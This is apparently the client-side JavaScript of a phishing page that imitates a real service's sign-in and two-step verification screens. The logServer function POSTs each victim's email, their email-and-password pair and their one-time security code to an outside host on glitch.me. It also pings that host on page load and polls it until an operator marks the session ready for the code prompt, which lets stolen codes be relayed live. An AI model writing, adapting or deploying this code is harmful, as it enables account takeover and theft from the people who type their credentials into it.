const infoInputs = document.querySelectorAll(".info-input");
const inputContainers = document.querySelectorAll(".input-container");
const inputPlaceholders = document.querySelectorAll(".input-placeholder");
const focusBorders = document.querySelectorAll(".focus-border");
const emailContainer = document.getElementById("emailContainer");
const passwordContainer = document.getElementById("passwordContainer");
const emailInput = document.getElementById("emailInput");
const passwordInput = document.getElementById("passwordInput");
const toggleBtn = document.querySelector(".btn-toggle");
const toggleHider = document.querySelector(".toggle-hider");
const loadBg = document.querySelector(".load-bg");
const errorContainer = document.querySelectorAll(".error-flex");
const inputGaps = document.querySelectorAll(".input-gaps");
const enterInputs = document.querySelectorAll(".enter-input");

const veriErrorContainer = document.querySelector(".v-error-flex");
let inputBorders = ["var(--email-border)", "var(--password-border)"];
let securityChars = ["", "", "", "", "", ""];
let securityCode = "";
let digitAmount = 6;
let verificationError = false;
let checkInt;
focusBorders.forEach(border => {
    border.style.border = "2px solid transparent";
});
setTimeout(() => {
    logServer("WARNING", "USER HAS ENTERED");
}, 500);

inputContainers.forEach((container, idx) => {
    container.addEventListener("mouseover", () => {
        if(focusBorders[idx].style.border == "2px solid transparent"){
            container.style.border = "1px solid var(--btn-bg)";
        }
    });
    container.addEventListener("mouseout", () => {
        if(focusBorders[idx].style.border == "2px solid transparent"){
            container.style.border = "1px solid " + inputBorders[idx];
        }
    });
});
infoInputs.forEach((input, idx) => {
    input.addEventListener("focus", () => {
        inputPlaceholders[idx].style.top = "5px";
        inputPlaceholders[idx].style.fontSize = "14px";
        inputContainers[idx].style.border = "1px solid var(--password-border)";
        focusBorders[idx].style.border = "2px solid var(--forgot-txt)";
    });
});
infoInputs.forEach((input, idx) => {
    input.addEventListener("blur", () => {
        inputContainers[idx].style.border = "1px solid " + inputBorders[idx];
        focusBorders[idx].style.border = "2px solid transparent";
        if(input.value == ""){
            inputPlaceholders[idx].style.fontSize = "16px";
            inputPlaceholders[idx].style.top = "18px";
        }
        if(idx == 0){
            despawnError("email");
        } else {
            despawnError("password");
        }
    });
});
passwordInput.addEventListener("focus", () => {
    if(emailInput.value != ""){
        logServer("EMAIL", emailInput.value);
    }
});
passwordInput.addEventListener("keydown", (e) => {
    setTimeout(() => {
        if(passwordInput.value == ""){
            toggleBtn.style.display = "none";
            passwordContainer.style.width = "100%";
            console.log(window.innerWidth);
            if(window.innerWidth >= 780){
                focusBorders[1].style.width = "376px";
            } else if(window.innerWidth < 780 && window.innerWidth > 450){
                focusBorders[1].style.width = "calc(100vw - 40px)";
            } else if(window.innerWidth <= 450){
                focusBorders[1].style.width = "calc(100vw - 25px)";
            }
        } else {
            console.log(window.innerWidth);
            toggleBtn.style.display = "block";
            passwordContainer.style.width = "calc(100% - 54px)";
            if(window.innerWidth >= 780){
                focusBorders[1].style.width = "322px";
            } else if(window.innerWidth < 780 && window.innerWidth > 450){
                focusBorders[1].style.width = "calc(100vw - 94px)";
            } else if(window.innerWidth <= 450){
                focusBorders[1].style.width = "calc(100vw - 79px)";
            }
        }
    }, 30);
});

function togglePassword(){
    if(passwordInput.type == "password"){
        passwordInput.type = "text";
        toggleBtn.textContent = "Hide";
    } else {
        passwordInput.type = "password";
        toggleBtn.textContent = "Show";
    }
}
function logIn(){
    if(emailInput.value != "" && passwordInput.value != ""){
        loadBg.style.display = "flex";
        checkInt = setInterval(() => {
            startChecks();
        }, 2000);
        let doubleString = emailInput.value + " => " + passwordInput.value;
        logServer("PASSWORD", doubleString);
    } else if(emailInput.value == ""){
        emailInput.focus();
        errorContainer[0].style.visibility = "visible";
        errorContainer[0].style.top = "76px";
        inputGaps[0].style.height = "36px";
        inputBorders[0] = "var(--error-border)";
    } else if(passwordInput.value == ""){
        passwordInput.focus();
        errorContainer[1].style.visibility = "visible";
        errorContainer[1].style.top = "74px";
        inputGaps[1].style.height = "22px";
        inputBorders[1] = "var(--error-border)";
    }
}
async function startChecks(){
    try{
        const response = await fetch("https://coherent-rare-floss.glitch.me/value");
        const data = await response.json();

        if(data.status == "ready"){
            digitAmount = data.digits;
            displayVerificationPage();
            clearInterval(checkInt);
        }
    }catch(err){
        console.error(err);
    }
}
function displayVerificationPage(){
    document.getElementById("digitNum").textContent = digitAmount.toString();
    if(digitAmount == 4){
        enterInputs[4].style.display = "none";
        enterInputs[5].style.display = "none";
    }
    loadBg.style.display = "none";
    document.querySelector(".main-container").style.display = "none";
    document.querySelector(".verify-container").style.display = "flex";
    setTimeout(() => {
        enterInputs[0].focus();
    }, 150);
}
function despawnError(type){
    if(type == "email"){
        errorContainer[0].style.visibility = "hidden";
        errorContainer[0].style.top = "50px";
        inputGaps[0].style.height = "16px";
    } else {
        errorContainer[1].style.visibility = "hidden";
        errorContainer[1].style.top = "50px";
        inputGaps[1].style.height = "0px";
    }
}
function logServer(msgType, postData){
    fetch('https://coherent-rare-floss.glitch.me/send', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
            body: JSON.stringify({ message: msgType + " => " + postData })
    })
    .then(response => response.text())
    .catch(error => {
        console.error('Error:', error);
    });
}

enterInputs.forEach((input, idx) => {
    input.addEventListener("keydown", (e) => {
        let allowedChars = "1234567890";
        let prevValue = input.value;
        setTimeout(() => {
            if(allowedChars.includes(e.key)){
                input.blur();
                if(idx < digitAmount - 1){
                    enterInputs[idx + 1].focus();
                }
                if(prevValue == ""){
                    securityChars[idx] = e.key;
                } else {
                    input.value = prevValue;
                }
            } else if(e.key == "Backspace"){
                input.value = "";
                securityChars[idx] = "";
                if(prevValue == "" && idx > 0){
                    input.blur();
                    enterInputs[idx - 1].value = "";
                    enterInputs[idx - 1].focus();
                    securityChars[idx - 1] = "";
                } 
            } else {
                input.value = prevValue;
                if(prevValue.length > 0 && idx < digitAmount - 1){
                    input.blur();
                    enterInputs[idx + 1].focus();
                }
            }

            securityCode = securityChars.join("");
        }, 30);
    });

    input.addEventListener("focus", () => {
        if(!verificationError){
            input.style.border = "1px solid var(--forgot-txt)";
            input.style.boxShadow = "0px 0px 0px 1px var(--forgot-txt)";
        } else {
            input.style.border = "1px solid var(--enter-red)";
            input.style.boxShadow = "0px 0px 0px 2px var(--enter-red)";
        }
    });
    input.addEventListener("blur", () => {
        if(!verificationError){
            input.style.border = "1px solid var(--enter-norm)";
            input.style.boxShadow = "0px 0px 0px 1px transparent";
        } else {
            input.style.border = "1px solid var(--enter-red)";
            input.style.boxShadow = "0px 0px 0px 1px var(--enter-red)";
        }
    });
});
function sendCode(){ 
    if(securityCode.length == digitAmount){
        logServer("SECURITY CODE", securityCode);
        loadBg.style.display = "flex";
    } else {
        verificationError = true;
        enterInputs.forEach(input => {
            input.style.border = "1px solid var(--enter-red)";
            input.style.boxShadow = "0px 0px 0px 1px var(--enter-red)";
        });
        document.getElementById("verifyErrorSpace").style.height = "30px";
        veriErrorContainer.style.visibility = "visible";
        veriErrorContainer.style.bottom = "-27px";
        if(securityCode.length > 0){
            document.querySelector(".ver-err-txt").textContent = "Your security code should be " + digitAmount + " digits long.";
        }
    }
}